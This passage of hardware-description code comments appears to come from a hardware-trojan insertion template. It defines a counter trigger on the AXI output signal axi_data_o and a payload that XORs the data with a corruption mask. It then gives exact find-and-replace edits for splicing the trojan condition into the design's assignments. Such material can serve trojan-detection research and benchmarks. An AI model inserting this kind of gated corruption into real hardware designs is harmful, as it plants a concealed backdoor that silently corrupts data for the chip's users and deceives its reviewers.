 ...
 *   
 * Trigger: Counter on axi_data_o
 * Payload: Corrupt axi_data_o with XOR mask
 * 
...
// ============================================================
// Integrity Violation: Corrupt axi_data_o with XOR
//
// Integration Script Must Modify:
//
// IF axi_data_o is assigned:
//   Find: assign axi_data_o = data_value;
//   Replace: assign axi_data_o = trojan_active ? (data_value ^ CORRUPTION_MASK) : data_value;
//
// IF axi_data_o is in always_ff:
//   Find: axi_data_o <= data_value;
//   Replace: axi_data_o <= trojan_active ? (data_value ^ CORRUPTION_MASK) : data_value;
//
